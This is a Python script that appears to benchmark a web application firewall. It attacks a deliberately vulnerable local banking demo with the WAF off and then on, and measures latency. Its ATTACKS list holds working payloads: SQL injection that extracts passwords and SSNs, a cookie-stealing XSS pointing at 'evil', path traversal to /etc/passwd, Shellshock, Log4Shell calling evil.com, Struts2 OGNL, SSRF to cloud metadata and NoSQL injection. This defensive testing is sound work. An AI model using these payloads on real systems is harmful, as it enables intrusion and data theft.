"""
Orchestrates the honest before/after proof:

  1. Boots NovaBank twice (WAF off, then WAF on) as subprocesses.
  2. Fires the SAME real attack payloads at each and records what happened:
       - WAF off: did the attack actually exfiltrate data / reflect script / read files?
       - WAF on : was it blocked (403) and by which layer?
  3. Runs a latency + throughput benchmark on benign traffic in both modes
     to quantify the consumer-facing cost of the WAF.
  4. Writes demo/results.json for the visual artifact.

Everything recorded is measured, not asserted.
"""
import json, os, subprocess, sys, time, statistics, socket
import urllib.request, urllib.error, urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)
PY = sys.executable


def wait_port(port, timeout=25):
    t = time.time()
    while time.time() - t < timeout:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=1):
                return True
        except OSError:
            time.sleep(0.3)
    return False


def boot(waf, port):
    env = dict(os.environ, WAF=waf, PORT=str(port))
    p = subprocess.Popen([PY, os.path.join(HERE, "vulnerable_app.py")],
                         env=env, cwd=ROOT,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if not wait_port(port):
        p.terminate()
        raise RuntimeError(f"app (WAF={waf}) failed to start on {port}")
    return p


def http(method, url, body=None, headers=None):
    data = body.encode() if isinstance(body, str) else body
    req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    t0 = time.perf_counter()
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            text = r.read().decode("utf-8", "ignore")
            ms = (time.perf_counter() - t0) * 1000
            return {"status": r.status, "body": text, "ms": ms,
                    "waf_latency": r.headers.get("X-WAF-Latency-ms"),
                    "waf_block": r.headers.get("X-WAF-Block")}
    except urllib.error.HTTPError as e:
        text = e.read().decode("utf-8", "ignore")
        ms = (time.perf_counter() - t0) * 1000
        return {"status": e.code, "body": text, "ms": ms,
                "waf_latency": e.headers.get("X-WAF-Latency-ms"),
                "waf_block": e.headers.get("X-WAF-Block")}
    except Exception as e:
        return {"status": 0, "body": f"ERROR:{e}", "ms": 0, "waf_latency": None, "waf_block": None}


# (name, cve, method, path, query, body, success_check)
#   success_check(resp) -> True means the ATTACK SUCCEEDED (only meaningful WAF-off)
def leaked_data(r):
    b = r["body"].lower()
    return any(s in b for s in ["ssn", "441-22-8765", "512-90-1234", "s3cr3t_r00t",
                                 "999999", "correcthorse", "hunter2"])

ATTACKS = [
    ("SQLi auth bypass", "classic", "POST", "/login", "",
     '{"username":"admin\' -- ","password":"x"}',
     leaked_data),
    ("SQLi UNION exfiltration", "classic", "GET", "/api/user",
     "id=0 UNION SELECT id,username||':'||password||':'||ssn,balance FROM users", "",
     leaked_data),
    ("SQLi boolean", "classic", "POST", "/login", "",
     '{"username":"john.doe","password":"x\' OR \'1\'=\'1"}', leaked_data),
    ("Reflected XSS", "classic", "GET", "/search",
     "q=<script>document.location='http://evil/'+document.cookie</script>", "",
     lambda r: "<script>" in r["body"]),
    ("Stored/query XSS (transfer)", "classic", "GET", "/transfer",
     "to=attacker&amt=1&note=<script>alert(1)</script>", "",
     lambda r: "<script>alert(1)</script>" in r["body"]),
    ("Path traversal (secrets)", "classic", "GET", "/download",
     "file=secret_config.txt", "",
     lambda r: "stripe_secret_key" in r["body"].lower()),
    ("Path traversal (deep)", "classic", "GET", "/download",
     "file=../../../../../../etc/passwd", "",
     lambda r: "root:" in r["body"]),
    ("Shellshock", "CVE-2014-6271", "GET", "/search",
     "q=() { :;}; /bin/bash -c 'cat /etc/passwd'", "",
     lambda r: r["status"] == 200 and "blocked" not in r["body"].lower()),
    ("Log4Shell", "CVE-2021-44228", "GET", "/search",
     "q=${jndi:ldap://evil.com/a}", "",
     lambda r: "${jndi" in r["body"]),
    ("Struts2 OGNL", "CVE-2017-5638", "GET", "/search",
     "q=%{(#cmd='id').(#p=new java.lang.ProcessBuilder(#cmd))}", "",
     lambda r: r["status"] == 200 and "blocked" not in r["body"].lower()),
    ("SSRF cloud metadata", "classic", "GET", "/download",
     "file=http://169.254.169.254/latest/meta-data/", "",
     lambda r: r["status"] == 200 and "blocked" not in r["body"].lower()),
    ("NoSQL injection", "classic", "POST", "/login", "",
     '{"username":{"$gt":""},"password":{"$gt":""}}',
     lambda r: r["status"] == 200 and "blocked" not in r["body"].lower()),
]

BENIGN = [
    ("GET", "/", "", None),
    ("GET", "/api/user", "id=1", None),
    ("GET", "/search", "q=wireless+headphones", None),
    ("POST", "/login", "", '{"username":"john.doe","password":"hunter2"}'),
    ("GET", "/transfer", "to=jane.smith&amt=100&note=rent", None),
]


def run_attacks(port, mode):
    out = []
    for name, cve, method, path, query, body, check in ATTACKS:
        # URL-encode the value part of each k=v so special chars actually reach the server
        enc = "&".join(
            (kv.split("=", 1)[0] + "=" + urllib.parse.quote(kv.split("=", 1)[1], safe=""))
            if "=" in kv else urllib.parse.quote(kv, safe="")
            for kv in query.split("&")
        ) if query else ""
        url = f"http://127.0.0.1:{port}{path}" + (f"?{enc}" if enc else "")
        hdr = {"Content-Type": "application/json"} if body else {}
        r = http(method, url, body if body else None, hdr)
        blocked = r["status"] == 403
        succeeded = (not blocked) and bool(check(r))
        out.append({
            "name": name, "cve": cve, "method": method, "path": path,
            "blocked": blocked, "status": r["status"],
            "attack_succeeded": succeeded,
            "waf_block_category": r.get("waf_block"),
            "evidence": r["body"][:220].replace("\n", " "),
        })
    return out


def bench(port, n=400):
    lat = []
    waf_lat = []
    for i in range(n):
        m, path, query, body = BENIGN[i % len(BENIGN)]
        url = f"http://127.0.0.1:{port}{path}" + (f"?{query}" if query else "")
        hdr = {"Content-Type": "application/json"} if body else {}
        r = http(m, url, body, hdr)
        if r["status"] in (200, 403):
            lat.append(r["ms"])
            if r.get("waf_latency"):
                try:
                    waf_lat.append(float(r["waf_latency"]))
                except (TypeError, ValueError):
                    pass
    lat.sort()
    def pct(p):
        return round(lat[min(len(lat) - 1, int(len(lat) * p))], 3) if lat else 0
    total_s = sum(lat) / 1000.0
    return {
        "n": len(lat),
        "mean_ms": round(statistics.mean(lat), 3) if lat else 0,
        "median_ms": round(statistics.median(lat), 3) if lat else 0,
        "p95_ms": pct(0.95), "p99_ms": pct(0.99),
        "throughput_rps": round(len(lat) / total_s, 1) if total_s else 0,
        "waf_overhead_mean_ms": round(statistics.mean(waf_lat), 4) if waf_lat else 0.0,
        "waf_overhead_p99_ms": round(sorted(waf_lat)[int(len(waf_lat)*0.99)-1], 4) if len(waf_lat) > 2 else 0.0,
    }


def inproc_latency():
    """Clean, network-free measurement of the WAF gate cost itself."""
    from demo.waf_gate import evaluate
    mix = [
        ("GET", "/products", "category=electronics&brand=apple&sort=price", ""),
        ("POST", "/login", "", '{"username":"john.doe","password":"hunter2"}'),
        ("GET", "/search", "q=wireless headphones", ""),
        ("GET", "/api/user", "id=1", ""),
        ("GET", "/articles/how-to-cook-pasta", "ref=homepage", ""),
    ]
    # warmup
    for _ in range(200):
        for m, p, q, b in mix:
            evaluate(m, p, q, b, {})
    lat = []
    for _ in range(4000):
        for m, p, q, b in mix:
            t = time.perf_counter()
            evaluate(m, p, q, b, {})
            lat.append((time.perf_counter() - t) * 1000)
    lat.sort()
    return {
        "samples": len(lat),
        "mean_ms": round(statistics.mean(lat), 4),
        "median_ms": round(statistics.median(lat), 4),
        "p95_ms": round(lat[int(len(lat) * 0.95)], 4),
        "p99_ms": round(lat[int(len(lat) * 0.99)], 4),
        "max_ms": round(lat[-1], 4),
        "throughput_rps": round(1000.0 / statistics.mean(lat)),
    }


def main():
    results = {"generated": time.strftime("%Y-%m-%d %H:%M:%S"), "attacks": {}, "bench": {}}
    results["waf_gate_latency"] = inproc_latency()

    # WAF OFF
    p = boot("off", 8000)
    try:
        results["attacks"]["off"] = run_attacks(8000, "off")
        results["bench"]["off"] = bench(8000)
    finally:
        p.terminate(); p.wait()
    time.sleep(1)

    # WAF ON
    p = boot("on", 8001)
    try:
        results["attacks"]["on"] = run_attacks(8001, "on")
        results["bench"]["on"] = bench(8001)
    finally:
        p.terminate(); p.wait()

    # Reconcile per-attack before/after
    combined = []
    off = {a["name"]: a for a in results["attacks"]["off"]}
    on = {a["name"]: a for a in results["attacks"]["on"]}
    for name in off:
        combined.append({
            "name": name, "cve": off[name]["cve"], "path": off[name]["path"],
            "off_succeeded": off[name]["attack_succeeded"], "off_status": off[name]["status"],
            "off_evidence": off[name]["evidence"],
            "on_blocked": on[name]["blocked"], "on_status": on[name]["status"],
            "on_block_category": on[name]["waf_block_category"],
        })
    results["combined"] = combined

    with open(os.path.join(HERE, "results.json"), "w") as f:
        json.dump(results, f, indent=2)

    # Console summary
    print("\n=== ATTACK RESULTS (real, measured) ===")
    print(f"{'attack':<30}{'cve':<16}{'WAF off':<14}{'WAF on':<14}")
    for c in combined:
        off_s = "EXPLOITED" if c["off_succeeded"] else "no effect"
        on_s = f"BLOCKED({c['on_block_category']})" if c["on_blocked"] else f"through({c['on_status']})"
        print(f"{c['name']:<30}{c['cve']:<16}{off_s:<14}{on_s:<14}")
    print("\n=== LATENCY / THROUGHPUT (benign traffic) ===")
    for m in ("off", "on"):
        b = results["bench"][m]
        print(f"WAF {m:<3}  mean={b['mean_ms']}ms  p95={b['p95_ms']}ms  p99={b['p99_ms']}ms  "
              f"rps={b['throughput_rps']}  waf_overhead_mean={b['waf_overhead_mean_ms']}ms")
    g = results["waf_gate_latency"]
    print(f"\n=== WAF GATE COST (in-process, network-free) ===")
    print(f"mean={g['mean_ms']}ms  median={g['median_ms']}ms  p95={g['p95_ms']}ms  "
          f"p99={g['p99_ms']}ms  max={g['max_ms']}ms  ~{g['throughput_rps']} req/s/core")
    print("\nWrote demo/results.json")


if __name__ == "__main__":
    main()
